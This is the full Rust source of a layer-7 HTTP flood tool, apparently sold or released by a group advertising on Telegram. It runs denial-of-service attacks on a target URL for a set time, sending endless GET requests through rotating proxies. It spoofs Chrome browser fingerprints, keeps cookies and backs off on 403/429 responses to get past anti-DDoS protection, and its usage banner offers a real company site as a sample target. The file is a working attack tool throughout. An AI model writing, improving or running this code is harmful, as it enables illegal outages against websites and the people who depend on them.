/*
    RUST flood
    
    (13 June, 2024)

    Features:
    - Redirect handler
    - Cookie system
    - Ratelimit system
    - Legit Chrome headers
    - Optional debugging
    - HTTPDDOS bypass

    Released by ATLAS API corporation (atlasapi.co)

    Made by Benshii Varga

    sudo apt install libssl-dev

    ulimit -n 999999
    ulimit -c 999999
*/

use reqwest_impersonate as reqwest;
use reqwest::impersonate::Impersonate;
use reqwest::Client;
use reqwest::{cookie::Jar};

use std::time::{Instant};
use std::sync::{Arc};
use std::{process, env};
use std::error::Error;
use std::io::Write;
use std::collections::HashMap;

use tokio::sync::Semaphore;
use tokio::time::{sleep, Duration};
use tokio::fs::File;
use tokio::io;
use tokio::task;
use tokio::io::{AsyncBufReadExt, BufReader};
use tokio::io::AsyncWriteExt;

use rand::prelude::SliceRandom;
use colored::Colorize;

#[derive(Debug)]
pub struct Attack {
    target: String,
    proxy: String,
    client: Option<Client>,
    //url: Url,
    rate: u64,
    debug: bool
}

impl Attack {
    fn new(target: &str, proxy: &str, rate: &u64, debug: &bool) -> Result<Self, Box<dyn Error>> {
        Ok(
            Attack{
                target: target.to_string(),
                proxy: proxy.to_string(),
                client: None,
                //url: target.to_string().parse::<Url>().unwrap(),
                rate: *rate,
                debug: *debug
            }
        )
    }

    fn impersonate(&self) -> Impersonate {
        let mut rng = rand::thread_rng();
        let profiles = vec![
            Impersonate::Chrome119,
            Impersonate::Chrome120,
            Impersonate::Chrome123,
            Impersonate::Chrome124,
            Impersonate::Chrome126,
        ];
    
        *profiles.choose(&mut rng).unwrap()
    }

    fn build_client(&mut self) -> Result<(), Box<dyn Error>> {
        let jar = Arc::new(Jar::default());

        let client = Client::builder()
            .impersonate(self.impersonate())
            .enable_ech_grease()
            .permute_extensions()
            .http2_prior_knowledge()
            .danger_accept_invalid_certs(true)
            .proxy(reqwest::Proxy::all(format!("http://{}", self.proxy)).expect("failed"))
            .cookie_provider(jar.clone())
            .cookie_store(true)
            .connect_timeout(Duration::from_secs(60))
            .build().unwrap();
        self.client = Some(client);
        Ok(())
    }

    async fn run(&mut self) -> Result<(), Box<dyn Error>> {
        let client = self.client.as_ref().unwrap();

        async fn send_requests(client: &reqwest::Client, target: &str, proxy: &str, rate: u64, debug: bool) -> Result<(), Box<dyn std::error::Error>> {
            for _ in 1..=rate {
                match client.get(target).send().await {
                    Ok(response) => {
                        let status = response.status();
                        match status {
                            reqwest::StatusCode::FORBIDDEN => {
                                sleep(Duration::from_secs(5)).await;
                            },
                            reqwest::StatusCode::TOO_MANY_REQUESTS => {
                                //println!("Too many requests, waiting for 30 seconds...");
                                sleep(Duration::from_secs(30)).await;
                            },
                            _ => {}
                        }
                        let cookies = response.cookies().collect::<Vec<_>>();
                        let cookie_string = cookies.iter()
                            .map(|cookie| format!("{}={}", cookie.name(), cookie.value()))
                            .collect::<Vec<_>>()
                            .join("; ");
    
                        //self.url = response.url().to_string().parse::<Url>().unwrap();
    
                        if debug {
                            if cookie_string.is_empty() {
                                println!("[{}] | [{}] {} status: {}",
                                    "RUST".bold(),
                                    proxy.magenta(),
                                    response.url().to_string().underline(),
                                    status.to_string().bold());
                                    //println!("version: {:?}", response.version());
    
                            } else {
                                println!("[{}] | [{}] {} status: {}, cookies: {}",
                                "RUST".bold(),
                                proxy.magenta(),
                                response.url().to_string().underline(),
                                status.to_string().bold(),
                                cookie_string.green());
                                //println!("version: {:?}", response.version());
                            }
                        }
        
                        //println!("Proxy: {}, Target: {}, Status: {}", proxy, target, status);
        
                    },
                    Err(err) => {
                        if debug {
                            if !err.to_string().contains("Reqwest") {
                                println!("[{}] | [{}] {}",
                                "RUST".bold(),
                                proxy.magenta(),
                                err.to_string());
                            }
                        }
                    }
                };
            }

            Ok(())
        }
    
        loop {
            send_requests(client, &self.target, &self.proxy, self.rate, self.debug).await?;
    
            // sleep(Duration::from_secs(1000/self.rate)).await;
        }
    }
}

async fn read_proxies(file_path: &str) -> io::Result<Vec<String>> {
    let file = File::open(file_path).await?;
    let reader = BufReader::new(file);
    let mut proxies = Vec::new();
    let mut lines = reader.lines();

    while let Some(line) = lines.next_line().await? {
        proxies.push(line);
    }

    Ok(proxies)
}

fn clear_screen() {
    print!("{}[2J", 27 as char);
    print!("{}[1;1H", 27 as char);
    std::io::stdout().flush().unwrap();
}

#[tokio::main(flavor = "multi_thread", worker_threads = 4)]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    clear_screen();

    let args: Vec<String> = env::args().collect();
    if std::env::args().len() < 5 {
        //clear_screen();
        println!("\n                {}\n                    {}\n\n                      {}\n\n                {}, {}\n\n  ./rust <target> <time> <threads> <rate> <proxies> <debug(true/false)>\n  ./rust https://www.cloudflare.com 300 1000 120 premium.txt true\n", "ATLAS API corporation".red().bold(), "t.me/atlasapi".cyan().underline(), "RUST v1.0".bold(), "Welcome back".italic(), USERNAME.italic());
        process::exit(0);
    }

    let target = match reqwest::Url::parse(&args[1].to_owned()) {
        Ok(target) => target,
        Err(_) => {
            println!("[!] Invalid target address \"{}\"!", args[1].to_owned());
            std::process::exit(1);
        },
    };

    // if !target.scheme().eq("https") {
    //     eprintln!("[!] Invalid target address (https only)!");
    //     process::exit(1);
    // }

    let time: u64 = match args[2].parse() {
        Ok(time) => time,
        Err(_) => {
            println!("[!] Invalid time \"{}\"!", args[2].to_owned());
            std::process::exit(1);
        },
    };

    let processes: usize = match args[3].parse() {
        Ok(p) => p,
        Err(_) => {
            println!("[!] Invalid number of processes \"{:?}\"", args[3].to_owned());
            std::process::exit(1);
        },
    };

    let rate: u64 = match args[4].parse() {
        Ok(rate) => rate,
        Err(_) => {
            println!("[!] Invalid rate \"{}\"!", args[4].to_owned());
            std::process::exit(1);
        }
    };

    let proxyfile = args[5].to_owned();

    match tokio::fs::metadata(proxyfile.clone()).await {
        Ok(_) => {},
        Err(_) => {
            println!("[!] file \"{}\" not found!", proxyfile);
            std::process::exit(1);
        },
    };

    let debug: bool = match args[6].parse() {
        Ok(d) => d,
        Err(_) => {
            println!("[!] Invalid debug format \"{:?}\"", args[6].to_owned());
            std::process::exit(1);
        },
    };

    println!("[!] Starting attack on {:?} for {:?} seconds!", target.to_string(), time);

    let proxies = read_proxies(&proxyfile).await?;

    let start_time = Instant::now();

    if processes > proxies.len() {
        println!("[!] Thread count cannot exceed the number of proxies!\"{:?}\"", args[6].to_owned());
        std::process::exit(1);
    }

    let semaphore = Arc::new(Semaphore::new(processes));

    std::thread::spawn(move || {
        loop {
            if Instant::now().duration_since(start_time) >= Duration::from_secs(time) {
                println!("[!] Attack ended!");
                std::process::exit(0);
            }
        }
    });

    let mut handles = Vec::new();

    for proxy in proxies.iter() {
        let target = target.to_string();
        let semaphore = Arc::clone(&semaphore);
        let proxy = proxy.clone();
        let debug = debug.clone();
        let rate = rate.clone();

        let handle = task::spawn(async move {
            let _permit = semaphore.acquire().await.unwrap();

            let mut attack = match Attack::new(&target, &proxy, &rate, &debug) {
                Ok(attack) => attack,
                Err(e) => {
                    eprintln!("Error creating attack: {:?}", e);
                    return;
                }
            };

            if let Err(e) = attack.build_client() {
                eprintln!("Error building client: {:?}", e);
                return;
            }

            if let Err(e) = attack.run().await {
                eprintln!("Error performing attack: {:?}", e);
            }
        });

        handles.push(handle);
    }

    for handle in handles {
        handle.await?;
    }

    tokio::signal::ctrl_c().await?;

    Ok(())
}
